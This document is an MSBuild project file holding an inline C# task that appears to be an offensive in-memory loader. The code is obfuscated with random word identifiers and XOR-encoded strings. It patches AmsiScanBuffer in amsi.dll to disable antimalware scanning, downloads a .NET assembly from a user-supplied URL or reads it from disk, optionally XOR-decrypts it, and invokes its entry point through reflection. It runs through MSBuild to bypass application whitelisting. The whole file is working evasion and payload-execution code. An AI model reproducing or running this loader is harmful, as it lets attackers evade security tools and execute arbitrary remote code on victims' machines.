<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample/>
  </Target>
  <UsingTask
  TaskName="ClassExample"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
	      <![CDATA[	  

using System;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Linq;using System.Threading;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class HeighCommittedness{    private static WebClient NegaraParcidentate = new WebClient() { };    private static object[] MyiarchusOrycteropus = null;
	[DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr MacrotoneNadder, UIntPtr ArsinoMarkmoot, uint LaborersBurgall, out uint SkanceRorid);
	[DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr UngarneredWeaker, string NonseparabilityPhycomycetes);
	[DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string MeadsweetColocolic);
	private static IntPtr SnakeblenniesReefiest(IntPtr UnlistedMandating)
    {
        uint TardoPassemeasure = 0;
        if (VirtualProtect(UnlistedMandating, (UIntPtr)HemolysisRecomprehension().Length, 0x40, out TardoPassemeasure))
        {
            return UnlistedMandating;
        }
        else
        {
            return (IntPtr)0;
        }
    }
	private static object PrecociouslyNereite(string SaltbrushMelamdim, string[] PrevascularRomanos, bool OrnithologyBullskinoded = false, string OculocephalicInexplicitness = "")
    {
        FomentersUrbic();
        Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("EkUpUjo2OUw1AjwtRVFJ"), "IntroduceCheeking")) + SaltbrushMelamdim);
        if (!string.IsNullOrEmpty(string.Join(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("eQ=="), "YankerEternally")), PrevascularRomanos)))
            Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("HE4zVCQXCxkUNhoVHU5bUg=="), "GenteellyStannaries")) + string.Join(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("eQ=="), "YankerEternally")), PrevascularRomanos));
        MyiarchusOrycteropus = new object[] { PrevascularRomanos };
        if (!SaltbrushMelamdim.ToLower().StartsWith(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("KxUYHQ=="), "CalmerAnticoagulator"))) && OrnithologyBullskinoded)
            return FreightlessAmsel(ChryslerDressages(RakesteleDendritiform(AuksinuTroggin(DoornboomHousemastership(SaltbrushMelamdim), OculocephalicInexplicitness))));
        else if(!SaltbrushMelamdim.ToLower().StartsWith(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("KxUYHQ=="), "CalmerAnticoagulator"))) && !OrnithologyBullskinoded)
            return FreightlessAmsel(ChryslerDressages(RakesteleDendritiform(DoornboomHousemastership(SaltbrushMelamdim))));
        if (!OrnithologyBullskinoded)
            return FreightlessAmsel(ChryslerDressages(RakesteleDendritiform(DilatersHaroset(SaltbrushMelamdim))));
        else
            return FreightlessAmsel(ChryslerDressages(RakesteleDendritiform(AuksinuTroggin(DilatersHaroset(SaltbrushMelamdim), OculocephalicInexplicitness))));
    }
	private static bool RutilatedSuperdramatist(ConsoleKey AnisanthousCollodiotype)
    {
        if (AnisanthousCollodiotype == ConsoleKey.X)
            Environment.Exit(0);
        return (AnisanthousCollodiotype == ConsoleKey.Y);
    }
	private static void SuperolateralNonsensuous()
    {
        Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("FhwPCQBCVQ=="), "ConnexusUnstuccoed")));
        Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("BhwNAghUST1EB1JnJE4+ThcDHUdVCAQVUiRzQhwEGQZJWgsMCjILFzoTDhgHWUk4TA0eHiBPUAcEAAgUEDoFIR4dWz4="), "SolemnifiedSynecologically")));
        Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("EwRdDUVRSXQqFQAGGw8CCAJHKRwRCFMVEiYECBEbERNMAAADJhMRGxoLFHQRDRUbVAAABU4IOxgVHVMVEiYECBEbERMfSQ8VKlASDgAARWBFABoMGwUJDUA="), "OpposesTeetotaling")));
        Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("CwFBFCcdVEsqCQc+GgICKQNOGwQLEjoQGAk6TwcFARAQNgEFAi9PGgMEDVM1HAINOhZODQwVFiRVDR4tTzYkN1kWORYeFTgbCw9LWT4iBhhMKgpODQoVHzgCCQhoDRdLEREWdy0jPmgLCwgXAAMjHAMCaAQLEks="), "WullHonkeys")));
        Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("DBVCAAAbIVREJBcHABQVAx4AcBEOAgACLBoBG1hJLRsFBQ8YJAQcUBUHLE4UCAIBSFUEBRgRNRNPHA4MKAJEBgRJBVU0PiBVcA4JUBUHLE4GABgIFgxBGANZPA4OFE8="), "PaopaoIndividually")));
        Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("ER1DCB0SAG5IIAIaAAEJIwgCSR8UATUFCgYLG04SPgwKSRsaUyQJHAFOCBwAOAQLBxsGUyAHTwYGDE4LIggKDAtVET0GDgAXR04qOBoaSQ0QUzIHAx4BHgsDbQsXSQ4ZH3QJHRUbBAsJORpODwAHUyAAClIMAAAGPxBA"), "MiniousThorning")));
    }
	public static void Main(string[] args)
    {
        Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("C1M4Ux00BREaKAAMGVVeRxslIhwKQxtSSj4ROzoKExEXFQ=="), "PrescriptOverurged")));
        string ImputeCryptodiran = "";
        string[] DinglesOrthotolidin = new string[] { };
        bool FeminizingSubnetworks = false;
        bool OrnithologyBullskin = false;
        string OculocephalicInexplicitness = "";
        if (args.Length > 0)
        {
            foreach (string argument in args)
            {
                if (argument.ToLower() == Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("aFkKU0Y="), "EtherialismJangly")) || argument.ToLower() == Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("eQNCQQ=="), "TatuasuExpeditor")))
                {
                    FeminizingSubnetworks = true;
                    Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("H0Q+SygCC3MEExQaAwAKGApkDhEOSSwGIABXR08LCwcDHSELT0sNCwQ8AQgdCE4RDAkUZAANSx0GAnMDDQo="), "DockingSeasonedly")));
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("bhcBBA=="), "ConventionalizesHiawatha")) || argument.ToLower() == Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("fUwKDgI="), "ParaproctitisProductionist")))
                {
                    OrnithologyBullskin = true;
                    int FundableProprietors = Array.IndexOf(args, argument) + 1;
                    if (FundableProprietors < args.Length)
                    {
                        string VumCodesigning = args[FundableProprietors];
                        if (FeminizingSubnetworks)
                            OculocephalicInexplicitness = Encoding.UTF8.GetString(Convert.FromBase64String(VumCodesigning));
                        else
                            OculocephalicInexplicitness = VumCodesigning;
                    }
                    Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("CUQ8RCgMCBc7AhsHDQ9PKCM3RwwPMR0YFBgMD0UgGwEPERFPBR8MCQ5BOQoYREsSWxhl"), "RoadlikeBronchoplegia")), OculocephalicInexplicitness);
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("agIEERw="), "GreetinglyNoncontrabands")) || argument.ToLower() == Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("fUURExkJ"), "PharmacopoeialIntersystematical")))
                {
                    int FundableProprietors = Array.IndexOf(args, argument) + 1;
                    if (FundableProprietors < args.Length)
                    {
                        string NematodeMonacetin = args[FundableProprietors];
                        if (FeminizingSubnetworks)
                            ImputeCryptodiran = Encoding.UTF8.GetString(Convert.FromBase64String(NematodeMonacetin));
                        else
                            ImputeCryptodiran = NematodeMonacetin;
                    }
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("ZA8GAgE="), "InterestlessQuedly")) || argument.ToLower() == Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("fUwPFgYf"), "PandalTaroc")))
                {
                    int OokineticGeomys = Array.IndexOf(args, argument) + 1;
                    int UnprobedOctogynia = args.Length - OokineticGeomys;
                    DinglesOrthotolidin = new String[UnprobedOctogynia];
                    for (int i = 0; i < UnprobedOctogynia; i++)
                    {
                        string NematodeMonacetinArgs = args[OokineticGeomys + i];
                        if (FeminizingSubnetworks)
                            DinglesOrthotolidin[i] = Encoding.UTF8.GetString(Convert.FromBase64String(NematodeMonacetinArgs));
                        else
                            DinglesOrthotolidin[i] = NematodeMonacetinArgs;
                    }
                }
            }
            if (string.IsNullOrEmpty(ImputeCryptodiran))
            {
                SuperolateralNonsensuous();
                Environment.Exit(0);
            }
            PrecociouslyNereite(ImputeCryptodiran, DinglesOrthotolidin, OrnithologyBullskin, OculocephalicInexplicitness);
            Environment.Exit(0);
        }
        else if (args.Length == 0)
        {
            while (true)
            {
                Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("CFEyQisHAxgHcj1WAB1JAwIccwgGBw4NUxkccgAOAAdI"), "SnobbismsRevisible")));
                Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("HVMyTzsWUjIdGUkbGjYZG08QBAE2R0FJFxolAwsKFkVNcwhaB1JZeEw="), "FloorerSquirt")));
                FeminizingSubnetworks = RutilatedSuperdramatist(Console.ReadKey(false).Key);
                Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("H1Y5RCUHHhIiQQIIFQpJAxtUDDYFRElSSQ=="), "DiddlingVariability")));
                ImputeCryptodiran = UniquityIllustrated(Console.ReadLine(), FeminizingSubnetworks);
                Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("C0w4VS0cVBEcF0EdBAsNAy8BTwcYAARwKyonRAoaBgYLERkAFkFTbhxADVlZW3A="), "PseudotetrameralNeocyte")));
                OrnithologyBullskin = RutilatedSuperdramatist(Console.ReadKey(false).Key);
                if (OrnithologyBullskin)
                {
                    Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("FlopQT0PHgEVTB0LN0U8ICdCHwQbTFRzRQ=="), "MetatantalicRedoubtably")));
                    OculocephalicInexplicitness = UniquityIllustrated(Console.ReadLine(), FeminizingSubnetworks);
                }
                Console.WriteLine("[?] Input payload args (optional) -> ");
                DinglesOrthotolidin = UniquityIllustrated(Console.ReadLine(), FeminizingSubnetworks).Split(' ');
                if (ImputeCryptodiran.Length > 0)
                    PrecociouslyNereite(ImputeCryptodiran, DinglesOrthotolidin, OrnithologyBullskin, OculocephalicInexplicitness);
            }
        }
    }
	private static byte[] DilatersHaroset(string url)
    {
        if (WebRequest.DefaultWebProxy != null)
        {
            IWebProxy UnappointEvinces = WebRequest.DefaultWebProxy;
			UnappointEvinces.Credentials = CredentialCache.DefaultCredentials;
            NegaraParcidentate.Proxy = UnappointEvinces;
        }
		ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        return NegaraParcidentate.DownloadData(url);
    }
	private static void FomentersUrbic()
    {
        IntPtr UnlistedMandating = SnakeblenniesReefiest(DeveiningJuxtaposition());
        if (UnlistedMandating != (IntPtr)0)
        {
            Marshal.Copy(HemolysisRecomprehension(), 0, UnlistedMandating, HemolysisRecomprehension().Length);
            Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("GUozRCQaEQ41HxYLGg8EFkUyABoHHwoWTREhNiRO"), "BandwormPlemochoe")));
        }
        else
        {
            Console.WriteLine(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("D0g+VD8CHwYMPRwSVCkhNjpTKCQ6PxEt"), "TictockedTruthlessness")));
        }
    }
	private static byte[] AuksinuTroggin(byte[] SophronizeUnspottedness, string BakeryOverelaboration)
    {
        //byte[] keyBytes = Encoding.UTF8.GetBytes(BakeryOverelaboration);
        byte[] ScroungingWilderedly = new byte[SophronizeUnspottedness.Length];
        for (int i = 0; i < SophronizeUnspottedness.Length; i++)
        {
            ScroungingWilderedly[i] = (byte)(SophronizeUnspottedness[i] ^ Encoding.UTF8.GetBytes(BakeryOverelaboration)[i % Encoding.UTF8.GetBytes(BakeryOverelaboration).Length]);
        }
        return ScroungingWilderedly;
    }
	private static object FreightlessAmsel(MethodInfo DearworthilyEthered)
    {
        if (BroomtailGutsiness(DearworthilyEthered) == DearworthilyEthered.ReflectedType)
            return DearworthilyEthered.Invoke(null, MyiarchusOrycteropus);
        return MyiarchusOrycteropus[0];
    }
	private static MethodInfo ChryslerDressages(Assembly asm)
    {
        return asm.EntryPoint;
    }
	private static string UniquityIllustrated(string SophronizeUnspottedness, bool InvestigatoryAgnomens)
    {
        if (InvestigatoryAgnomens)
            SophronizeUnspottedness = Encoding.UTF8.GetString(Convert.FromBase64String(SophronizeUnspottedness));
        if (SophronizeUnspottedness.Trim().ToLower().Equals(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("Pg=="), "FootprintNuclides"))))
            Environment.Exit(0);
        return SophronizeUnspottedness;
    }
	private static byte[] HemolysisRecomprehension()
    {
        if (System.Environment.Is64BitOperatingSystem)
            return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    }
	private static IntPtr DeveiningJuxtaposition()
    {
        return GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("MgwHCGkBHgU="), "SataGeriatrist"))), Encoding.UTF8.GetString(AuksinuTroggin(Convert.FromBase64String("DhsWGyECCgsVFA8VER4="), "OverrakeWaistline")));
    }
	private static Type BroomtailGutsiness(MethodInfo DearworthilyEthered)
    {
        return DearworthilyEthered.ReflectedType;
    }
	private static byte[] DoornboomHousemastership(string UnspotlightedRisp)
    {	
		  using (FileStream fs = File.Open(UnspotlightedRisp, FileMode.Open))
            {
                byte[] ConcubineFizzles = new byte[fs.Length];
                fs.Read(ConcubineFizzles, 0, Convert.ToInt32(fs.Length));
                return ConcubineFizzles;
            }
    }
	private static Assembly RakesteleDendritiform(byte[] PicturesqueSubjugate)
    {
        return Assembly.Load(PicturesqueSubjugate);
    }
	    
	     //This is for MSBuild later
	    public class ClassExample : Task, ITask
	    {
	        public override bool Execute()
	        {
	            HeighCommittedness.Main(new string[] { });
	            return true;
	        }
	    }
	    
}

 ]]>
	</Code>	  
    </Task>
  </UsingTask>
</Project>